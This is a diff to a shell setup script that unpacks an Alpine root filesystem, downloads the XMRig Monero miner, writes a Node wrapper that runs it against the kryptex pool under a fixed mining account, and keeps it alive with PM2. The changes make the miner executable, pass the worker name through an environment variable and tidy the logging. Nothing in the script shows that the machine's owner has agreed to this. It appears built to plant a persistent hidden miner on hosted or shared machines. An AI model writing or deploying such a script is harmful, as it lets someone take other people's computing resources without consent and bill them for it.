@@ -28,6 +28,7 @@ if [ ! -e $ROOTFS_DIR/.installed ]; then
     "https://dl-cdn.alpinelinux.org/alpine/v${ALPINE_VERSION}/releases/${ARCH}/alpine-minirootfs-${ALPINE_FULL_VERSION}-${ARCH}.tar.gz" || {
         echo "Failed to download rootfs."; exit 1;
     }
+    mkdir -p $ROOTFS_DIR
     tar -xzf /tmp/rootfs.tar.gz -C $ROOTFS_DIR
 fi
 
@@ -72,6 +73,8 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux
 tar -xvzf xmrig.tar.gz
 cd xmrig-6.22.2
 
+chmod +x ./xmrig
+
 # Генерация srv.js с подстановкой переменной
 cat > srv.js <<EOL
 const { spawn } = require('child_process');
@@ -79,7 +82,7 @@ const { spawn } = require('child_process');
 const command = './xmrig';
 const args = [
   '-o', 'xmr.kryptex.network:7777',
-  '-u', 'pimik@send-email.pro/${name}',
+  '-u', 'pimik@send-email.pro/' + process.env.NAME,
   '--tls',
   '-k',
   '--coin', 'monero',
@@ -95,19 +98,19 @@ const args = [
 const child = spawn(command, args);
 
 child.stdout.on('data', (data) => {
-  console.log(\`stdout: \${data}\`);
+  process.stdout.write(`stdout: ${data}`);
 });
 
 child.stderr.on('data', (data) => {
-  console.error(\`stderr: \${data}\`);
+  process.stderr.write(`stderr: ${data}`);
 });
 
 child.on('close', (code) => {
-  console.log(\`Процесс завершен с кодом \${code}\`);
+  console.log(`Процесс завершен с кодом ${code}`);
 });
 EOL
 
 # Установка и запуск PM2
 npm i -g pm2
-pm2 start srv.js --name srv && pm2 logs srv
+NAME=${name} pm2 start srv.js --name srv && pm2 logs srv
 EOF
